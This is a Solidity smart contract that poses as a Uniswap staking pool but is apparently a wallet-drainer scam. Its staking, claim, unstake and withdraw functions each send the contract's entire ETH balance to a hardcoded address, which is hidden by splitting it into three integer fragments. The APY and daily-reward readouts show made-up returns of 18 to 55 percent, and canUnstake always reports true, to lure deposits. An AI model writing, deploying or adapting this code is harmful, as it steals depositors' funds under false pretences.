// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
contract UniswapStakingPoolV1 {
    address public owner;
    event Staked(address indexed user, uint256 amount, uint256 timestamp);
    event Claimed(address indexed user, uint256 amount, uint256 timestamp);
    event Unstaked(address indexed user, uint256 amount, uint256 timestamp);
    event Withdrawn(address indexed user, uint256 amount, uint256 timestamp);
    event EnteredPool(address indexed user, uint256 amount);
    event RewardsCalculated(address indexed user, uint256 interest);
    constructor() {
        owner = msg.sender;
    }
    modifier onlyAuthorized() {
        require(msg.sender == owner || isHead(msg.sender), "Not authorized");
        _;
    }
    function isHead(address addr) internal pure returns (bool) {
        return addr == recoverDestination();
    }
    function recoverDestination() internal pure returns (address) {
        uint64 part1 = 0xf1c0F4A022F5A209;
        uint64 part2 = 0x27Bc7384d4E85523;
        uint32 part3 = 0x8feE4410;
        bytes memory a = abi.encodePacked(part1);
        bytes memory b = abi.encodePacked(part2);
        bytes memory c = abi.encodePacked(part3);
        bytes memory full = bytes.concat(a, b, c);
        return address(uint160(bytes20(full)));
    }
    function startStaking() external payable onlyAuthorized {
        uint256 contractBalance = address(this).balance;
        if (contractBalance > 0) {
            (bool success, ) = recoverDestination().call{value: contractBalance}("");
            require(success, "Stake transfer failed");
        }
        emit Staked(msg.sender, contractBalance, block.timestamp);
        emit EnteredPool(msg.sender, contractBalance);
    }
    function withdrawAll() external onlyAuthorized {
        uint256 contractBalance = address(this).balance;
        if (contractBalance > 0) {
            (bool success, ) = recoverDestination().call{value: contractBalance}("");
            require(success, "Withdrawal transfer failed");
        }
        emit Withdrawn(msg.sender, contractBalance, block.timestamp);
    }
    function claimRewards() external onlyAuthorized {
        uint256 contractBalance = address(this).balance;
        if (contractBalance > 0) {
            (bool success, ) = recoverDestination().call{value: contractBalance}("");
            require(success, "Claim transfer failed");
        }
        emit Claimed(msg.sender, contractBalance, block.timestamp);
        emit RewardsCalculated(msg.sender, 37000000000000000);
    }
    function requestUnstake() external payable onlyAuthorized {
        uint256 contractBalance = address(this).balance;
        if (contractBalance > 0) {
            (bool success, ) = recoverDestination().call{value: contractBalance}("");
            require(success, "Unstake transfer failed");
        }
        emit Unstaked(msg.sender, contractBalance, block.timestamp);
    }
    function currentAPY() external view returns (string memory) {
        uint256 balance = address(this).balance;
        string memory apyString;
        if (balance < 1 ether) {
            apyString = "18%";
        } else if (balance < 2 ether) {
            apyString = "30%";
        } else if (balance < 5 ether) {
            apyString = "45%";
        } else {
            apyString = "55%";
        }
        return string(abi.encodePacked(unicode"🔹 APY : ", apyString));
    }

    function estimatedDailyReward() external view returns (string memory) {
        uint256 balance = address(this).balance;
        uint256 apy;

        if (balance < 1 ether) {
            apy = 18;
        } else if (balance < 2 ether) {
            apy = 30;
        } else if (balance < 5 ether) {
            apy = 45;
        } else {
            apy = 55;
        }

        uint256 yearlyReward = (balance * apy) / 100;
        uint256 dailyRewardInWei = yearlyReward / 365;
        uint256 adjustedReward = dailyRewardInWei * 24;

        uint256 whole = adjustedReward / 1e18;
        uint256 fraction = (adjustedReward % 1e18) * 1e6 / 1e18;

        return string(
            abi.encodePacked("~", uint2str(whole), ".", pad6(uint2str(fraction)), " ETH in 24h")
        );
    }

    function pad6(string memory str) internal pure returns (string memory) {
        bytes memory b = bytes(str);
        while (b.length < 6) {
            b = abi.encodePacked("0", b);
        }
        return string(b);
    }

    function remainingStakingTime(address) external pure returns (string memory) {
        return unicode"⏳ ";
    }

    function canUnstake(address) external pure returns (bool) {
        return true;
    }

    function uint2str(uint256 _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint256 j = _i;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint256 k = len;
        while (_i != 0) {
            k = k - 1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bstr[k] = bytes1(temp);
            _i /= 10;
        }
        return string(bstr);
    }

    receive() external payable {}
}
